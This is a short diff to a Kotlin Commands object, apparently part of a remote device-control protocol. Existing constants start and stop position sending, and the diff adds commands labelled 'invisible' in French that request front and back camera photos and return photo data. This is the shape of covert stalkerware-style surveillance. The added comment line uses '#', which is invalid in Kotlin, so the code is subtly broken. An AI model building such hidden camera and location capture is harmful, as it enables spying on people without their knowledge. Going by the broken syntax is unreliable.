@@ -6,4 +6,9 @@ object Commands {
     const val REQUEST_POS_START = "!!START_SEND"
     const val REQUEST_POS_STOP = "!!STOP_SEND"
     const val RESPONSE_POS = "!!POS:"
+    
+    # 📸 NOUVELLES COMMANDES INVISIBLES
+    const val REQUEST_PHOTO_FRONT = "!!PHOTO_FRONT"
+    const val REQUEST_PHOTO_BACK = "!!PHOTO_BACK"
+    const val RESPONSE_PHOTO = "!!PHOTO_DATA:"
 }
